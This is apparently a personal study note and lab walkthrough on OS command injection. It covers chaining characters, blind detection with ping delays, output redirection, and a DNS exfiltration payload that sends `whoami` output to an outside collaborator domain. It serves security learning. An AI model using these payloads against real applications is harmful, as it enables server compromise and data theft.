# OS command injection

It's about injecting commands  on the server which is running an application and fully compromise the data as well as application.

If a application usages the following request to view the stock 

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

In the background something like  the following code might be running

```
stockreport.pl 381 29
```

As there is no defence again OS command injection attacker could run 


```
& echo aiwefwlguh &
```

which may give the following error 

```
Error - productID was not provided
aiwefwlguh
29: command not found
```


## Useful commands  
| Purpose of Command        | Linux        | Windows         |  
|---------------------------|--------------|-----------------|  
| Name of current user      | `whoami`     | `whoami`        |  
| Operating system          | `uname -a`   | `ver`           |  
| Network configuration     | `ifconfig`   | `ipconfig /all` |  
| Network connections       | `netstat -an`| `netstat -an`   |  
| Running processes         | `ps -ef`     | `tasklist`      |  
 



## Blind OS command injection vulnerabilities

Most of the instances are based on blind OS command injection which means, there is no response return from the command within it's `HTTP` response. 


Let's say and feedback application is being using where email is being sent using mail command.

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

The output from the mail command is not returned on the application's responses. 

**Detecting blind OS command injection using time delays**

We can use time delay to check if os command is being executated or not, One of the best method is to use `ping` command as it will let us specify the number of ICMP packets to sent.

```
& ping -c 10 127.0.0.1 &
``` 
This command causes the application to ping its loopback network adapter for 10 seconds. 

## Exploiting blind OS command injection by redirecting output

If an application is serving files from `/var/www/static` we can redirect the output of the command to the static directory 

```
& whoami /var/www/static/0xtheM7.txt &
```


## Exploiting blind OS command injection using out-of-band (OAST) techniques

We can inject command that will tirgger an out of bound network interaction 

```
& nslookup himansu.com.np &
```

```
& nslookup 0xthem7.xyz &
```


## Ways of injecting OS commands

Characters used for both unix based system and windows which can be chained together.


```
&
&&
|
||
```
Commands for unix based system only

```
;
```
```
Newline (0x0a or \n) 
```

To perform inline command injection the following characters can be used.

```
`
```

```
$
```

Sometimes the output comes with `"` or `'` which could block the attack in this situation you may need to use the [meta characters](https://en.wikipedia.org/wiki/Metacharacter) according to the shell.


# Labs
## Lab: OS command injection, simple case

Check the stock and send the following request 
```
POST / product / stock HTTP / 2
Host: 0 a240078040afaa68551a563009200e3.web - security - academy.net
Cookie: session = QVkvVxREjzeXTb4B1zF470CS39mKcuhx
User - Agent: Mozilla / 5.0(X11; Linux x86_64; rv: 138.0) Gecko / 20100101 Firefox / 138.0
Accept: *
/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a240078040afaa68551a563009200e3.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a240078040afaa68551a563009200e3.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=2&storeId=1;whoami
```

## Lab: Blind OS command injection with time delays

Payload used to solve the lab 

```
email=x||ping+-c+10+127.0.0.1||
```

Assuming this is injected into a parameter (`email`) in a backend system that uses it unsafely like:

```
somecommand --email=$email
```

Email is being controlled by attacker as we are filling the form


```
email=x||ping+-c+10+127.0.0.1||
```

It get's split in 

`x` → just a placeholder or dummy value

`||` → logical OR in the shell

`ping` -c 10 127.0.0.1 → ping localhost 10 times

`||` → another OR (used to chain commands or ensure execution)



As `email=x` is going to fail ping command will be triggered. 

You can also run on your terminal 

```
0xtheM7 || whoami
```

```
echo 0xtheM7 || whomami
```

The first command will run `whoami` as there is no command such as `0xtheM7` or Logical OR will run `whoami` command but in case of second on we wil be runngin `echo` command 



## Lab: Blind OS command injection with output redirection

Payload used to solve the lab 

```
csrf=2g6DRob8aEXHozDiwXDVj2UERt46YtmP&name=Coolcool&email=x||whoami+>+/var/www/images/0xtheM7.txt||&subject=cool&message=cool
```

The we fetched the output over 

https://YOURINSTANCE//image?filename=0xtheM7.txt


## Lab: Blind OS command injection with out-of-band interaction

Payload used to solve the lab 


```
csrf=vGk1Dn16qDq6NL7e0FV7fWmNmPOLMzFX&name=Himansu&email=x||nslookup+ld2qv0chx7z7doolkvdjryla117svij7.oastify.com||&subject=Cool&message=Cool
```

In this we have used the same bypass mechanism however we used internal command `nslookup` so that we can find out it it's hitting out server or not. 

## Lab: Blind OS command injection with out-of-band data exfiltration 
Payload used to solve the lab 


```
csrf=rcLcNvCAFojt490aCvcJ520UERrBXVly&name=Coool&email=x||nslookup+`whoami`.q3uvl52mncpc3teqa03oh3bfr6xxlq9f.oastify.com||&subject=Cool&message=Cool
```

Here we ran command ```whoami``` using backtick ``` `whoami` ``` which is used to run inline command and thus complete DNS query become 

```
{outputOfWhoami}.q3uvl52mncpc3teqa03oh3bfr6xxlq9f.oastify.com
```

And under the collaborator we could find the username which eventually solved the lab.